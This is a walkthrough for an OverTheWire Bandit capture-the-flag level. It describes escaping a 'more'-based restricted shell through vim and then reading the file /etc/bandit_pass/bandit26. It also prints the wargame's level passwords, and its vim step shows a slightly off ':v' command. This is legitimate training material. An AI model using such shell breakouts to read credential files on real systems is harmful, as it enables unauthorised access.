# OverTheWire Bandit CTF – Level 25

## 🏆 **Goal**  
The goal of Bandit Level 25 is to log into **bandit26**. The shell for **bandit26** is not `/bin/bash`, so you need to figure out how to break out of it and read the password.

---

## 🚀 **Steps to Solve**

### 1. **Connect via SSH**  
Use the password obtained from Level 24 to log into **bandit25** using SSH:

```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
```

- **Username:** bandit25  
- **Hostname:** bandit.labs.overthewire.org  
- **Port:** 2220  

When prompted, enter the password from Level 24:

```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

---

### 2. **Find the Shell for Bandit26**  
Check the shell defined for the **bandit26** user:

```bash
cat /etc/passwd | grep bandit26
```

Example output:
```
bandit26:x:11026:11026::/home/bandit26:/usr/bin/showtext
```

The shell is set to `/usr/bin/showtext`.

---

### 3. **Examine the Shell**  
Open and examine the shell script:

```bash
cat /usr/bin/showtext
```

Example output:
```bash
#!/bin/sh
more ~/text.txt
```

The script runs the `more` command on `text.txt` — this is the key to breaking out of the restricted shell.

---

### 4. **Log Into Bandit26**  
Use the provided SSH key to log into **bandit26**:

```bash
ssh -i bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
```

---

### 5. **Exploit the `more` Command**  
The `more` command allows interactive access. You can escape it using **vim**:

1. Minimize your terminal to interrupt the output.  
2. Type `v` to open the file in **vim**.  
3. Once in **vim**, type `:e /etc/bandit_pass/bandit26` to open the password file.  

Example:
```
:v
:e /etc/bandit_pass/bandit26
```

Output:
```
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

---

## 📸 **Screenshot**  
![Level-25](https://github.com/user-attachments/assets/515a25ca-c0f5-40e4-a7d0-cbb5cb4386af)
![Level-25](https://github.com/user-attachments/assets/270cdfb4-97a9-46cc-8f6f-9b50d6b26bd8)
![Level-25](https://github.com/user-attachments/assets/297c8daf-283d-4347-9d81-a42bd161c7f4)

---

## 🔑 **Password for Next Level**  
The password for **Level 26** is:

```
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

---

## ✅ **Summary**  
✔️ Connected to the server using SSH.  
✔️ Identified that the shell is a custom script using `more`.  
✔️ Used `vim` to escape the restricted shell and read the password.  

---

**Next Step:** Proceed to [Level 26](https://overthewire.org/wargames/bandit/bandit26.html) to continue the challenge.  

---
